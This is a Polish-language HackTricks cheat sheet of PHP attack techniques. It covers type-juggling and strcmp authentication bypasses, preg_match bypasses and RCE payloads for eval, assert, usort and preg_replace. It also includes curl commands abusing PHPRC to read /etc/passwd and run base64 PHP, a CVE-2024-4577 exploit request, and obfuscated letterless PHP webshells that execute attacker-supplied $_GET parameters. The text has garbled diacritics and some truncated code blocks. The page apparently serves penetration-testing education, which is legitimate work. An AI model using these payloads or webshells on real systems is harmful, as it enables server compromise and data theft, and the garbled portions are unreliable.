# PHP Tricks

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}

<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Typowa lokalizacja ciasteczek:

To r贸wnie偶 dotyczy ciasteczek phpMyAdmin.

Ciasteczka:
```
PHPSESSID
phpMyAdmin
```
Lokalizacje:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Obejcie por贸wna PHP

### Lu藕ne por贸wnania/Typ Juggling ( == )

Jeli `==` jest u偶ywane w PHP, to istniej nieoczekiwane przypadki, w kt贸rych por贸wnanie nie zachowuje si zgodnie z oczekiwaniami. Dzieje si tak, poniewa偶 "==" por贸wnuje tylko wartoci przeksztacone do tego samego typu, jeli chcesz r贸wnie偶 por贸wna, 偶e typ por贸wnywanych danych jest taki sam, musisz u偶y `===`.

Tabele por贸wna PHP: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (567).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Cig znak贸w, kt贸ry nie zaczyna si od liczby, jest r贸wny liczbie
* `"0xAAAA" == "43690" -> True` Cigi skadajce si z liczb w formacie dziesitnym lub szesnastkowym mog by por贸wnywane z innymi liczbami/cigami z wynikiem True, jeli liczby byy takie same (liczby w cigu s interpretowane jako liczby)
* `"0e3264578" == 0 --> True` Cig zaczynajcy si od "0e" i nastpnie cokolwiek bdzie r贸wny 0
* `"0X3264578" == 0X --> True` Cig zaczynajcy si od "0" i nastpnie dowolna litera (X mo偶e by dowoln liter) i nastpnie cokolwiek bdzie r贸wny 0
* `"0e12334" == "0" --> True` To jest bardzo interesujce, poniewa偶 w niekt贸rych przypadkach mo偶esz kontrolowa cig wejciowy "0" oraz niekt贸re treci, kt贸re s haszowane i por贸wnywane z nim. Dlatego, jeli mo偶esz dostarczy warto, kt贸ra stworzy hash zaczynajcy si od "0e" i bez 偶adnej litery, mo偶esz obej por贸wnanie. Mo偶esz znale藕 **ju偶 haszowane cigi** w tym formacie tutaj: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Dowolna litera w cigu jest r贸wna int 0

Wicej informacji w [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Typ Juggling** r贸wnie偶 wpywa na funkcj `in_array()` domylnie (musisz ustawi trzeci argument na true, aby dokona cisego por贸wnania):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Jeli ta funkcja jest u偶ywana do **jakiejkolwiek weryfikacji uwierzytelnienia** (jak sprawdzanie hasa) i u偶ytkownik kontroluje jedn stron por贸wnania, mo偶e wysa pust tablic zamiast cigu jako warto hasa (`https://example.com/login.php/?username=admin&password[]=`) i obej t weryfikacj:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Ten sam bd wystpuje z `strcasecmp()`

### cise mieszanie typ贸w

Nawet jeli `===` jest **u偶ywane**, mog wystpi bdy, kt贸re sprawiaj, 偶e **por贸wnanie jest podatne** na **mieszanie typ贸w**. Na przykad, jeli por贸wnanie **konwertuje dane na inny typ obiektu przed por贸wnaniem**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** mo偶e by u偶yty do **walidacji danych wejciowych u偶ytkownika** (sprawdza, czy jakiekolwiek **sowo/regex** z **czarnej listy** jest **obecne** w **danych wejciowych u偶ytkownika**, a jeli nie, kod mo偶e kontynuowa swoje wykonanie).

#### Ominicie nowej linii

Jednak偶e, przy delimitacji pocztku regexp `preg_match()` **sprawdza tylko pierwsz lini danych wejciowych u偶ytkownika**, wic jeli w jaki spos贸b mo偶esz **wysa** dane wejciowe w **kilku liniach**, mo偶esz by w stanie obej to sprawdzenie. Przykad:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Aby obej t kontrol, mo偶esz **wysa warto z nowymi liniami zakodowanymi w URL** (`%0A`) lub jeli mo偶esz wysa **dane JSON**, wylij je w **kilku liniach**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Znajd藕 przykad tutaj: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Obejcie bdu dugoci**

(To obejcie byo podobno testowane na PHP 5.2.5 i nie mogem go uruchomi na PHP 7.3.15)\
Jeli mo偶esz wysa do `preg_match()` wa偶ny bardzo **du偶y input**, **nie bdzie w stanie go przetworzy** i bdziesz m贸g **obej** kontrol. Na przykad, jeli czarna lista dotyczy JSON-a, mo偶esz wysa:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
From: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### Ominicie ReDoS

Sztuczka z: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) i [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Kr贸tko m贸wic, problem wystpuje, poniewa偶 funkcje `preg_*` w PHP opieraj si na [bibliotece PCRE](http://www.pcre.org/). W PCRE niekt贸re wyra偶enia regularne s dopasowywane przy u偶yciu wielu wywoa rekurencyjnych, co zu偶ywa du偶o miejsca na stosie. Mo偶na ustawi limit na liczb dozwolonych rekurencji, ale w PHP ten limit [domylnie wynosi 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), co jest wicej ni偶 mieci si na stosie.

[Ten wtek na Stackoverflow](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) r贸wnie偶 zosta podlinkowany w pocie, w kt贸rym bardziej szczeg贸owo omawiano ten problem. Nasze zadanie byo teraz jasne:\
**Wylij dane wejciowe, kt贸re spowoduj, 偶e regex wykona 100\_000+ rekurencji, powodujc SIGSEGV, co sprawi, 偶e funkcja `preg_match()` zwr贸ci `false`, a tym samym aplikacja pomyli, 偶e nasze dane wejciowe nie s zoliwe, zaskakujc na kocu adunku czym w rodzaju `{system(<verybadcommand>)}` w celu uzyskania SSTI --> RCE --> flagi :)**.

C贸偶, w terminach regex, tak naprawd nie wykonujemy 100k "rekurencji", ale zamiast tego liczymy "kroki cofania", kt贸re, jak stwierdza [dokumentacja PHP](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), domylnie wynosi 1\_000\_000 (1M) w zmiennej `pcre.backtrack_limit`.\ 
Aby to osign, `'X'*500_001` spowoduje 1 milion krok贸w cofania (500k do przodu i 500k do tyu):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Typowe przeczanie typ贸w dla obfuskacji PHP
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

Jeli PHP przekierowuje na inn stron, ale 偶adna funkcja **`die`** lub **`exit`** nie jest **wywoywana po ustawieniu nag贸wka `Location`**, PHP kontynuuje wykonywanie i dodaje dane do treci:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Wykorzystanie przejcia cie偶ki i wczenia plik贸w

Sprawd藕:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## Wicej sztuczek

* **register\_globals**: W **PHP < 4.1.1.1** lub w przypadku bdnej konfiguracji, **register\_globals** mo偶e by aktywne (lub ich zachowanie jest naladowane). Oznacza to, 偶e w zmiennych globalnych, takich jak $\_GET, jeli maj warto np. $\_GET\["param"]="1234", mo偶esz uzyska do nich dostp przez **$param. Dlatego, wysyajc parametry HTTP, mo偶esz nadpisa zmienne** u偶ywane w kodzie.
* **Ciasteczka PHPSESSION tej samej domeny s przechowywane w tym samym miejscu**, dlatego jeli w obrbie domeny **r贸偶ne ciasteczka s u偶ywane w r贸偶nych cie偶kach**, mo偶esz sprawi, 偶e jedna cie偶ka **uzyska dostp do ciasteczka drugiej cie偶ki**, ustawiajc warto ciasteczka innej cie偶ki.\
W ten spos贸b, jeli **obie cie偶ki uzyskuj dostp do zmiennej o tej samej nazwie**, mo偶esz sprawi, 偶e **warto tej zmiennej w path1 bdzie miaa zastosowanie w path2**. A nastpnie path2 uzna zmienne path1 za wa偶ne (nadajc ciasteczku nazw, kt贸ra odpowiada jej w path2).
* Kiedy masz **nazwy u偶ytkownik贸w** u偶ytkownik贸w maszyny. Sprawd藕 adres: **/\~\<USERNAME>**, aby zobaczy, czy katalogi php s aktywowane.
* [**LFI i RCE przy u偶yciu wrapper贸w php**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Funkcje te s zazwyczaj u偶ywane w PHP do **generowania hashy z hase** i do **sprawdzania**, czy haso jest poprawne w por贸wnaniu z hashem.\
Obsugiwane algorytmy to: `PASSWORD_DEFAULT` i `PASSWORD_BCRYPT` (zaczyna si od `$2y$`). Zauwa偶, 偶e **PASSWORD\_DEFAULT czsto jest tym samym co PASSWORD\_BCRYPT.** A obecnie, **PASSWORD\_BCRYPT** ma **ograniczenie rozmiaru wejcia do 72 bajt贸w**. Dlatego, gdy pr贸bujesz zhashowa co wikszego ni偶 72 bajty za pomoc tego algorytmu, tylko pierwsze 72B zostanie u偶yte:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP headers bypass abusing PHP errors

#### Causing error after setting headers

Z [**tego wtku na Twitterze**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A\&s=19) mo偶na zobaczy, 偶e wysyajc wicej ni偶 1000 parametr贸w GET lub 1000 parametr贸w POST lub 20 plik贸w, PHP nie ustawi nag贸wk贸w w odpowiedzi.

Pozwala to na obejcie na przykad nag贸wk贸w CSP ustawianych w kodach takich jak:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### Wypenianie ciaa przed ustawieniem nag贸wk贸w

Jeli **strona PHP wywietla bdy i zwraca niekt贸re dane wprowadzone przez u偶ytkownika**, u偶ytkownik mo偶e sprawi, 偶e serwer PHP zwr贸ci **tre wystarczajco dug**, aby podczas pr贸by **dodania nag贸wk贸w** do odpowiedzi serwer zgosi bd.\
W nastpujcym scenariuszu **atakujcy spowodowa, 偶e serwer zgosi kilka du偶ych bd贸w**, a jak wida na ekranie, gdy PHP pr贸bowao **zmodyfikowa informacje o nag贸wkach, nie mogo** (na przykad nag贸wek CSP nie zosta wysany do u偶ytkownika):

![](<../../../.gitbook/assets/image (1085).png>)

## SSRF w funkcjach PHP

Sprawd藕 stron:

{% content-ref url="php-ssrf.md" %}
[php-ssrf.md](php-ssrf.md)
{% endcontent-ref %}

## Wykonanie kodu

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Sprawd藕 to dla bardziej przydatnych funkcji PHP](php-useful-functions-disable\_functions-open\_basedir-bypass/)

### **RCE za pomoc** **preg\_replace()**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Aby wykona kod w argumencie "replace", potrzebne jest przynajmniej jedno dopasowanie.\
Ta opcja preg\_replace zostaa **wycofana od PHP 5.5.0.**

### **RCE za pomoc Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE via Assert()**

Ta funkcja w php pozwala na **wykonywanie kodu zapisanego w cigu** w celu **zwr贸cenia true lub false** (a w zale偶noci od tego zmieni wykonanie). Zazwyczaj zmienna u偶ytkownika bdzie wstawiana w rodek cigu. Na przykad:\
`assert("strpos($_GET['page']),'..') === false")` --> W tym przypadku, aby uzyska **RCE**, mo偶esz zrobi:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Bdziesz musia **zama** skadni **kodu**, **doda** sw贸j **adunek**, a nastpnie **naprawi to z powrotem**. Mo偶esz u偶y **operacji logicznych** takich jak "**and" lub "%26%26" lub "|"**. Zauwa偶, 偶e "or", "||" nie dziaa, poniewa偶 jeli pierwszy warunek jest prawdziwy, nasz adunek nie zostanie wykonany. W ten sam spos贸b ";" nie dziaa, poniewa偶 nasz adunek nie zostanie wykonany.

**Inn opcj** jest dodanie do cigu wykonania polecenia: `'.highlight_file('.passwd').'`

**Inn opcj** (jeli masz wewntrzny kod) jest modyfikacja niekt贸rej zmiennej, aby zmieni wykonanie: `$file = "hola"`

### **RCE za pomoc usort()**

Ta funkcja jest u偶ywana do sortowania tablicy element贸w za pomoc okrelonej funkcji.\
Aby nadu偶y tej funkcji:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Mo偶esz r贸wnie偶 u偶y **//** do komentowania reszty kodu.

Aby odkry liczb nawias贸w, kt贸re musisz zamkn:

* `?order=id;}//`: otrzymujemy komunikat o bdzie (`Parse error: syntax error, unexpected ';'`). Prawdopodobnie brakuje nam jednego lub wicej nawias贸w.
* `?order=id);}//`: otrzymujemy **ostrze偶enie**. To wydaje si w porzdku.
* `?order=id));}//`: otrzymujemy komunikat o bdzie (`Parse error: syntax error, unexpected ')' i`). Prawdopodobnie mamy za du偶o zamykajcych nawias贸w.

### **RCE przez .httaccess**

Jeli mo偶esz **przesa** **.htaccess**, to mo偶esz **skonfigurowa** kilka rzeczy, a nawet wykona kod (konfigurujc, 偶e pliki z rozszerzeniem .htaccess mog by **wykonywane**).

R贸偶ne powoki .htaccess mo偶na znale藕 [tutaj](https://github.com/wireghoul/htshells)

### RCE przez zmienne rodowiskowe

Jeli znajdziesz luk, kt贸ra pozwala ci **modyfikowa zmienne rodowiskowe w PHP** (i inn, aby przesya pliki, chocia偶 z wikszym badaniem mo偶e to by mo偶liwe do obejcia), mo偶esz nadu偶y tego zachowania, aby uzyska **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Ta zmienna rodowiskowa pozwala na adowanie dowolnych bibliotek podczas wykonywania innych binarnych (chocia偶 w tym przypadku mo偶e to nie dziaa).
* **`PHPRC`** : Instrukcja dla PHP, **gdzie znale藕 plik konfiguracyjny**, zazwyczaj nazywany `php.ini`. Jeli mo偶esz przesa wasny plik konfiguracyjny, u偶yj `PHPRC`, aby wskaza PHP na niego. Dodaj wpis **`auto_prepend_file`**, okrelajcy drugi przesany plik. Ten drugi plik zawiera normalny **kod PHP, kt贸ry jest nastpnie wykonywany** przez rodowisko PHP przed jakimkolwiek innym kodem.
1. Przelij plik PHP zawierajcy nasz shellcode
2. Przelij drugi plik, zawierajcy dyrektyw **`auto_prepend_file`**, instruujc preprocesor PHP do wykonania pliku, kt贸ry przesalimy w kroku 1
3. Ustaw zmienn `PHPRC` na plik, kt贸ry przesalimy w kroku 2.
* Uzyskaj wicej informacji na temat wykonania tego acucha [**z oryginalnego raportu**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - inna opcja
* Jeli **nie mo偶esz przesya plik贸w**, mo偶esz u偶y w FreeBSD "pliku" `/dev/fd/0`, kt贸ry zawiera **`stdin`**, bdc **treci** 偶dania wysanego do `stdin`:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Lub aby uzyska RCE, wcz **`allow_url_include`** i dodaj plik z **kodem PHP w base64**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Technika [**z tego raportu**](https://vulncheck.com/blog/juniper-cve-2023-36845).

### XAMPP CGI RCE - CVE-2024-4577

Serwer WWW analizuje 偶dania HTTP i przekazuje je do skryptu PHP wykonujcego 偶danie takie jak [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar\&ref=labs.watchtowr.com) jako `php.exe cgi.php foo=bar`, co pozwala na wstrzyknicie parametr贸w. To pozwoli na wstrzyknicie nastpujcych parametr贸w, aby zaadowa kod PHP z treci:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
Ponadto mo偶liwe jest wstrzyknicie parametru "-" za pomoc znaku 0xAD z powodu p贸藕niejszej normalizacji PHP. Sprawd藕 przykad exploita z [**tego posta**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/):
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitization bypass & Brain Fuck

[**W tym pocie**](https://blog.redteam-pentesting.de/2024/moodle-rce/) mo偶na znale藕 wietne pomysy na generowanie kodu PHP w stylu brain fuck z bardzo ograniczon liczb dozwolonych znak贸w.\
Ponadto zaproponowano r贸wnie偶 interesujcy spos贸b na wykonywanie funkcji, kt贸re pozwoliy im na ominicie kilku kontroli:
```php
(1)->{system($_GET[chr(97)])}
```
## PHP Static analysis

Sprawd藕, czy mo偶esz wstawi kod w wywoania tych funkcji (z [tutaj](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Jeli debugujesz aplikacj PHP, mo偶esz globalnie wczy drukowanie bd贸w w `/etc/php5/apache2/php.ini`, dodajc `display_errors = On` i zrestartowa apache: `sudo systemctl restart apache2`

### Deobfuskacja kodu PHP

Mo偶esz u偶y **web**[ **www.unphp.net**](http://www.unphp.net) **do deobfuskacji kodu php.**

## Wrappery PHP i protokoy

Wrappery PHP i protokoy mog pozwoli ci na **obejcie ochrony zapisu i odczytu** w systemie i jego kompromitacj. Aby [**uzyska wicej informacji, sprawd藕 t stron**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug nieautoryzowane RCE

Jeli widzisz, 偶e **Xdebug** jest **wczony** w wyjciu `phpconfig()`, powiniene spr贸bowa uzyska RCE za pomoc [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Zmienne zmiennych
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE nadu偶ywajc nowego $\_GET\["a"]\($\_GET\["b")

Jeli na stronie mo偶esz **utworzy nowy obiekt dowolnej klasy**, mo偶esz uzyska RCE, sprawd藕 nastpujc stron, aby si dowiedzie:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Wykonaj PHP bez liter

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### U偶ywajc 贸semkowego
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If 垄___ not needed then $_($__), show_source(.passwd)
```
### XOR atwy kod powoki

Zgodnie z [**tym opisem** ](https://mgp25.com/ctf/Web-challenge/)mo偶liwe jest wygenerowanie atwego kodu powoki w ten spos贸b:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Wic, jeli mo偶esz **wykona dowolny PHP bez cyfr i liter** mo偶esz wysa 偶danie takie jak poni偶sze, wykorzystujc ten adunek do wykonania dowolnego PHP:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Dla bardziej szczeg贸owego wyjanienia sprawd藕 [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (wewntrz eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl like
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}
